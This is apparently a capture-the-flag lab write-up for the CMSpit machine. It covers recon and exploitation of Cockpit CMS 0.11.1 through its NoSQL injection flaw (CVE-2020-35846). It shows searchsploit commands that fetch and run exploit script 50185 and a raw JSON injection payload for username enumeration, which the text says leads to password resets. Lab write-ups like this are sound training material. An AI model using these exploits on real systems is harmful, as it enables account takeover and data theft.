### CMSpit
This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.

## üñ•Ô∏è Initial Recon:
Beginning with a basic nmap scan:
```bash
nmap -A 10.10.116.219
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 11:10 +06

Ports 22 and 80 are open; focusing on port 80.

## üåê Web Enum:
Visiting port 80 provides us with a login page.

***‚óè What is the name of the Content Management System (CMS) installed on the server?***

Ans: The CMS name is displayed on the login page (cockpit).

***‚óè What is the version of the¬†Content Management System (CMS)¬†installed on the server?***

Ans: TThe version number can be found in the login page's source code. Right-click the page, open the source code, and examine it carefully (0.11.1).

***‚óè What is the path that allow user enumeration?***

**Path: /auth/check**\
This endpoint in Cockpit CMS 0.11.1 is vulnerable to NoSQL Injection (CVE-2020-35846), allowing attackers to enumerate valid usernames.

**Exploitation:**\
There‚Äôs both an automated and a manual exploit; let‚Äôs try the automated one first.
```bash
searchsploit cockpit 0.11.1
```
you'll find the exploit, now it's time to download and execute.
```bash
searchsploit -m 50185
```
```bash
python3 50185.py -u http://IP/
```
This vulnerability allows extracting password reset tokens, retrieving full user details (including email, hashed password, and user ID), and resetting any user's password without authentication.
To manually test for vulnerabilities, use Burp Suite to intercept login attempts with arbitrary credentials, then craft an exploit payload based on resources like Exploit-DB.
```bash
{"auth":{"user":{"$func":"var_dump"},"password":"admin"},"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"}
```
This is the one I used
